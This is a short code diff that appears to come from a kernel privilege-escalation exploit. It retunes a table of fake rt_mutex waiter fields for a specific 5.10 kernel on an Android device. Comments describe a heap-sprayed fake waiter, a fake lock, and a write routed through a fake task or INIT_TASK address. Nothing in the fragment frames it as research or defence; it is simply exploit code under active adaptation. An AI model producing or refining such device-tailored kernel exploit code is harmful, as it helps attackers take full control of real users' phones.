@@ -1333,16 +1333,20 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
                   "lock=fake_lock (plateau)\n");
         }
         struct pselect_waiter_word words[] = {
-          {2, tree_pc, "tree_pc"},
-          {3, tree_r, "tree_right"},
-          {4, tree_l, "tree_left"},
-          {5, pi_parent, "pi_parent"},
-          {6, pi_right, "pi_right"},
-          {7, pi_left, "pi_left"},
-          {8, stack_task, "task"},
-          {9, stack_lock, "lock"},
-          {10, stack_prio, "prio"},
-          {11, stack_deadline, "deadline"},
+          /* JoinChang compact 5.10 layout (verified on CPH2521):
+           * waiter words 0-9 at natural struct offsets, shift=0.
+           * tree_entry: pc@0 right@1 left@2; pi_tree@3-5;
+           * task@6 lock@7 prio@8 deadline@9.
+           * The walk needs lock+task+prio; the write comes from
+           * the SPRAYED W0 fake waiter (heap), not the stamp. */
+          {2, 0, "tree_left"},
+          {3, 0, "pi_parent"},
+          {4, 0, "pi_right"},
+          {5, 0, "pi_left"},
+          {6, pselect_custom_write_enabled() ? fake_task : text_addr(INIT_TASK), "task"},
+          {7, fake_lock, "lock"},
+          {8, 0, "prio"},
+          {9, 0, "deadline"},
         };
         for (size_t i = 0; i < sizeof(words) / sizeof(words[0]); i++) {
           struct pselect_waiter_word *w = &words[i];
